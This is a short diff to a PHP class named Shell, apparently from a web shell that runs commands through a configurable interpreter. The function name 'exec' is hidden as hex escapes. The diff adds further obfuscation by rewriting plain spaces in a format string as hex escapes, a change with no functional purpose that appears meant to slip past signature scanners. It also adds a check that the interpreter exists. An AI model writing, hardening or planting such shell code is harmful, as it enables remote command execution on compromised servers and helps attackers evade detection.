@@ -185,7 +185,11 @@ class Shell {
                 $output_tpl = "Array (\n%s\n)";
 
                 foreach ($this->config as $config_name => $config_value) {
-                    $output_str .= sprintf("  %s => %s\n", $config_name, $config_value);
+                    $output_str .= sprintf(
+                        "\x20\x20%s\x20=>\x20%s\n",
+                        $config_name,
+                        $config_value
+                    );
                 }
 
                 $output_str = rtrim($output_str, "\n");
@@ -203,6 +207,8 @@ class Shell {
 
                 if (empty($interpreter)) {
                     $output = 'No interpreter is set yet';
+                } elseif (!function_exists($interpreter)) {
+                    $output = 'Interpreter is not a valid function';
                 } elseif ($interpreter == "\x65\x78\x65\x63") {
                     $return_var = null;
                     $output_arr = array();
